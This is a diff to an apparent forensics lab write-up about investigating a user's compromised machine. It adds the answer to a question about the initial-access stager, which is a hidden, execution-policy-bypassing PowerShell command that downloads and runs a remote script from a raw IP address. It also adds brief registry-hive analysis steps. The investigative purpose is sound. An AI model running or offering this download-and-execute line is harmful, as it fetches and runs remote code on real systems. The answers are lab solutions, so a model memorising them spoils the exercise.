@@ -6,7 +6,15 @@ Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had download
 
 Q1: It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
 
-A: 
+A: powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
+
+We go to the hive of the indicated user.
+
+![](../../Img/Pasted%20image%2020250513152918.png)
+
+Load it and go to bookmark.
+
+
 
 Q2: At what time in UTC did the malicious payload execute?
 
